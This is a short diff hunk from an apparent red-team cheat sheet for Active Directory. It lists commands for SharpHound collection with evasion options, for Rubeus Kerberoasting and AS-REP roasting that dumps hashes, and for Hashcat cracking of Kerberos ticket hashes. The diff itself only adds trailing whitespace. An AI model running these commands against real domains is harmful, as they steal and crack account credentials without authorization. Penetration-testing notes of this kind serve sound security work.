@@ -6,7 +6,7 @@ GhostPack Tools
     - Examples: https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/
   SharpHound.exe -c All, Loggedon [-s|-d] --Throttle 20 --Jitter 7 --NoSaveCache --RandomFilenames --EncryptZip
   Rubeus.exe keberoast asreproast /format:hashcat /outfile:hashes.tx
-    Hashcat -a0 -w3 -m 13100 [-r rules file] /path/to/hashes /path/to/dictionary
+    Hashcat -a0 -w3 -m 13100 [-r rules file] /path/to/hashes /path/to/dictionary 
     
 Bloodhound/Neo4J
   # FIND SPN WITH DOMAIN ADMIN
